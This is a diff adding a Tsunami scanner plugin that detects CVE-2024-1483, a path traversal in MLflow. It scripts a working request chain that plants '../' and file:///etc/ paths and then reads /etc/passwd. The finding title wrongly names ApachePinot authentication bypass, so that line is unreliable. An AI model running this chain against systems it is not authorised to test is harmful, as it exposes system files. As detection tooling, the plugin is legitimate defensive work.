@@ -1,0 +1,173 @@
+# proto-file: proto/templated_plugin.proto
+# proto-message: TemplatedPlugin
+
+###############
+# PLUGIN INFO #
+###############
+
+info: {
+  type: VULN_DETECTION
+  name: "MLFlow_CVE_2024_1483"
+  author: 
+    "Robert Dick (robert@doyensec.com) for the Templated version,"
+    " rdj (rdj@crackatoa.id) for the original Java version"
+  version: "2.0"
+}
+
+finding: {
+  main_id: {
+    publisher: "GOOGLE"
+    value: "MLFlow_CVE_2024_1483"
+  }
+  severity: HIGH
+  title: "ApachePinot is vulnerable to Authentication Bypass"
+  description: "A path traversal vulnerability exists in mlflow/mlflow version < 2.12.1, allowing attackers to access arbitrary files on the server"
+  recommendation: "Upgrade MLflow version to 2.12.1 and above"
+  related_id: {
+    publisher: "CVE"
+    value: "CVE-2024-1483"
+  }
+}
+
+###########
+# ACTIONS #
+###########
+
+actions: {
+  name: "fingerprint_mlflow"
+  http_request: {
+    method: GET
+    uri: "/"
+    headers: { name: "User-Agent" value: "TSUNAMI_SCANNER"}
+    response: {
+      http_status: 200
+      expect_all: {
+        conditions: [
+          { body: {} contains: '<title>MLflow</title>' }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "create_experiment"
+  http_request: {
+    method: POST
+    uri: "/ajax-api/2.0/mlflow/experiments/create"
+    headers: [
+      { name: "User-Agent" value: "TSUNAMI_SCANNER"},
+      { name: "Content-Type" value: "application/json"}
+    ]
+    data: "{\"name\":\"tsunami_scanner_{{ T_UTL_CURRENT_TIMESTAMP_MS }}\",\"artifact_location\":\"http:///#/../../../../../../../../../../../../../../etc/\"}"
+    response: {
+      http_status: 200
+      extract_all: {
+        patterns: [
+          {
+            from_body: { }
+            regexp: '"experiment_id": "([^"]+)"'
+            variable_name: "EXPERIMENT_ID"
+          }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "create_run"
+  http_request: {
+    method: POST
+    uri: "/api/2.0/mlflow/runs/create"
+    headers: [
+      { name: "User-Agent" value: "TSUNAMI_SCANNER"},
+      { name: "Content-Type" value: "application/json"}
+    ]
+    data: "{\"experiment_id\":\"{{ EXPERIMENT_ID }}\"}"
+    response: {
+      http_status: 200
+      extract_all: {
+        patterns: [
+          {
+            from_body: { }
+            regexp: '"run_id":"([^"]+)"'
+            variable_name: "RUN_ID"
+          }
+        ]
+      }
+    }
+  }
+}
+
+actions: {
+  name: "register_model"
+  http_request: {
+    method: POST
+    uri: "/ajax-api/2.0/mlflow/registered-models/create"
+    headers: [
+      { name: "User-Agent" value: "TSUNAMI_SCANNER"},
+      { name: "Content-Type" value: "application/json"}
+    ]
+    data: "{\"name\":\"tsunami_scanner_{{ T_UTL_CURRENT_TIMESTAMP_MS }}\"}"
+    response: {
+      http_status: 200
+    }
+  }
+}
+
+actions: {
+  name: "create_model_version"
+  http_request: {
+    method: POST
+    uri: "/ajax-api/2.0/mlflow/model-versions/create"
+    headers: [
+      { name: "User-Agent" value: "TSUNAMI_SCANNER"},
+      { name: "Content-Type" value: "application/json"}
+    ]
+    data: "{\"name\":\"tsunami_scanner_{{ T_UTL_CURRENT_TIMESTAMP_MS }}\", \"run_id\":\"{{ RUN_ID }}\", \"source\":\"file:///etc/\"}"
+    response: {
+      http_status: 200
+    }
+  }
+}
+
+actions: {
+  name: "get_artifact"
+  http_request: {
+    method: GET
+    uri: "/model-versions/get-artifact?path=passwd&name=tsunami_scanner_{{ T_UTL_CURRENT_TIMESTAMP_MS }}&version=1"
+    headers: [
+      { name: "User-Agent" value: "TSUNAMI_SCANNER"},
+      { name: "Content-Type" value: "application/json"}
+    ]
+    response: {
+      http_status: 200
+      expect_any: {
+        conditions: [
+          { body: {} contains: "root:x:0:0" },
+          { body: {} contains: "root:*:0:0" }
+        ]
+      }
+    }
+  }
+}
+
+config: {
+  debug: true
+}
+
+#############
+# WORKFLOWS #
+#############
+
+workflows: {
+  actions: [
+    "fingerprint_mlflow",
+    "create_experiment",
+    "create_run",
+    "register_model",
+    "create_model_version",
+    "get_artifact"
+  ]
+}
